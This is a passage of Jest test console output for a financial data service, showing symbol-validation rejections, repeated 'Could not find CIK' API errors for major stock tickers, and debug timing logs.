
> veritak-financial-platform@1.0.0 test
> node --max-old-space-size=4096 --expose-gc node_modules/.bin/jest --runInBand --reporters=default --no-coverage

  console.log
    [dotenv@17.2.2] injecting env (27) from .env -- tip: ⚙️  override existing env vars with { override: true }

      at _log (node_modules/dotenv/lib/main.js:139:11)

  console.warn
    ⚠ SEC EDGAR API is not accessible - this may be due to rate limiting or network issues

      62 |         console.log('✓ SEC EDGAR API is accessible')
      63 |       } else {
    > 64 |         console.warn('⚠ SEC EDGAR API is not accessible - this may be due to rate limiting or network issues')
         |                 ^
      65 |       }
      66 |     }, 20000)
      67 |

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:64:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Symbol contains suspicious patterns, Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Symbol contains suspicious patterns, Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Symbol contains suspicious patterns, Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Symbol contains suspicious patterns, Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.log
    [2025-09-21T23:25:24.297Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:24.382Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol AAPL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "AAPL",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:121:32)

  console.log
    [2025-09-21T23:25:24.383Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 86ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 86,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:24.383Z] DEBUG [InstitutionalDataService] Starting API call: getInsiderTransactions
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:24.534Z] ERROR [InstitutionalDataService] API Error: GET insider_transactions - Could not find CIK for symbol AAPL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "insider_transactions",
      "error": {},
      "symbol": "AAPL",
      "days": 180
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInsiderTransactions (app/services/financial-data/InstitutionalDataService.ts:267:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:122:36)

  console.log
    [2025-09-21T23:25:24.535Z] DEBUG [InstitutionalDataService] Performance: getInsiderTransactions completed in 152ms
    Metadata: {
      "type": "performance",
      "operation": "getInsiderTransactions",
      "duration": 152,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.log
    [2025-09-21T23:25:24.606Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:24.661Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol AAPL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "AAPL",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:139:22)

  console.log
    [2025-09-21T23:25:24.662Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 56ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 56,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:24.722Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:24.769Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol AAPL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "AAPL",
      "quarters": 2
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:149:24)

  console.log
    [2025-09-21T23:25:24.769Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 47ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 47,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    ⚠ No institutional holdings found for AAPL - this may be due to data availability or API limitations

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:180:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.log
    [2025-09-21T23:25:24.888Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:24.941Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol MSFT
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "MSFT",
      "quarters": 1
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:197:26)

  console.log
    [2025-09-21T23:25:24.941Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 53ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 53,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:24.941Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:25.107Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol MSFT
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "MSFT",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:198:28)

  console.log
    [2025-09-21T23:25:25.108Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 167ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 167,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:25.176Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:25.222Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol GOOGL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "GOOGL",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:214:25)

  console.log
    [2025-09-21T23:25:25.223Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 47ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 47,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:25.223Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:25.416Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol GOOGL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "GOOGL",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:219:25)

  console.log
    [2025-09-21T23:25:25.418Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 195ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 195,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:25.496Z] DEBUG [InstitutionalDataService] Starting API call: getInsiderTransactions
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:25.549Z] ERROR [InstitutionalDataService] API Error: GET insider_transactions - Could not find CIK for symbol TSLA
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "insider_transactions",
      "error": {},
      "symbol": "TSLA",
      "days": 180
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInsiderTransactions (app/services/financial-data/InstitutionalDataService.ts:267:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:237:28)

  console.log
    [2025-09-21T23:25:25.550Z] DEBUG [InstitutionalDataService] Performance: getInsiderTransactions completed in 54ms
    Metadata: {
      "type": "performance",
      "operation": "getInsiderTransactions",
      "duration": 54,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    ⚠ No insider transactions found for TSLA - this may be due to data availability or API limitations

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:272:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.log
    [2025-09-21T23:25:25.667Z] DEBUG [InstitutionalDataService] Starting API call: getInsiderTransactions
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:25.718Z] ERROR [InstitutionalDataService] API Error: GET insider_transactions - Could not find CIK for symbol AMZN
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "insider_transactions",
      "error": {},
      "symbol": "AMZN",
      "days": 30
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInsiderTransactions (app/services/financial-data/InstitutionalDataService.ts:267:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:289:26)

  console.log
    [2025-09-21T23:25:25.719Z] DEBUG [InstitutionalDataService] Performance: getInsiderTransactions completed in 52ms
    Metadata: {
      "type": "performance",
      "operation": "getInsiderTransactions",
      "duration": 52,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:25.719Z] DEBUG [InstitutionalDataService] Starting API call: getInsiderTransactions
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:25.905Z] ERROR [InstitutionalDataService] API Error: GET insider_transactions - Could not find CIK for symbol AMZN
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "insider_transactions",
      "error": {},
      "symbol": "AMZN",
      "days": 180
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInsiderTransactions (app/services/financial-data/InstitutionalDataService.ts:267:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:290:29)

  console.log
    [2025-09-21T23:25:25.906Z] DEBUG [InstitutionalDataService] Performance: getInsiderTransactions completed in 187ms
    Metadata: {
      "type": "performance",
      "operation": "getInsiderTransactions",
      "duration": 187,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:25.989Z] DEBUG [InstitutionalDataService] Starting API call: getInsiderTransactions
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:26.088Z] ERROR [InstitutionalDataService] API Error: GET insider_transactions - Could not find CIK for symbol META
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "insider_transactions",
      "error": {},
      "symbol": "META",
      "days": 180
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInsiderTransactions (app/services/financial-data/InstitutionalDataService.ts:267:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:306:29)

  console.log
    [2025-09-21T23:25:26.089Z] DEBUG [InstitutionalDataService] Performance: getInsiderTransactions completed in 100ms
    Metadata: {
      "type": "performance",
      "operation": "getInsiderTransactions",
      "duration": 100,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:26.089Z] DEBUG [InstitutionalDataService] Starting API call: getInsiderTransactions
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:26.386Z] ERROR [InstitutionalDataService] API Error: GET insider_transactions - Could not find CIK for symbol META
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "insider_transactions",
      "error": {},
      "symbol": "META",
      "days": 180
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInsiderTransactions (app/services/financial-data/InstitutionalDataService.ts:267:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:311:29)

  console.log
    [2025-09-21T23:25:26.388Z] DEBUG [InstitutionalDataService] Performance: getInsiderTransactions completed in 299ms
    Metadata: {
      "type": "performance",
      "operation": "getInsiderTransactions",
      "duration": 299,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:26.466Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalIntelligence
    Metadata: {
      "timeout": 45000,
      "retries": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:26.467Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:26.469Z] DEBUG [InstitutionalDataService] Starting API call: getInsiderTransactions
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:26.521Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol NVDA
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "NVDA",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 0)
      at InstitutionalDataService.executeGetInstitutionalIntelligence (app/services/financial-data/InstitutionalDataService.ts:283:40)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:329:28)

  console.log
    [2025-09-21T23:25:26.522Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 55ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 55,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 0)

  console.error
    [2025-09-21T23:25:26.744Z] ERROR [InstitutionalDataService] API Error: GET insider_transactions - Could not find CIK for symbol NVDA
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "insider_transactions",
      "error": {},
      "symbol": "NVDA",
      "days": 180
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInsiderTransactions (app/services/financial-data/InstitutionalDataService.ts:267:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 1)
      at InstitutionalDataService.executeGetInstitutionalIntelligence (app/services/financial-data/InstitutionalDataService.ts:283:40)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:329:28)

  console.log
    [2025-09-21T23:25:26.745Z] DEBUG [InstitutionalDataService] Performance: getInsiderTransactions completed in 276ms
    Metadata: {
      "type": "performance",
      "operation": "getInsiderTransactions",
      "duration": 276,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 1)

  console.log
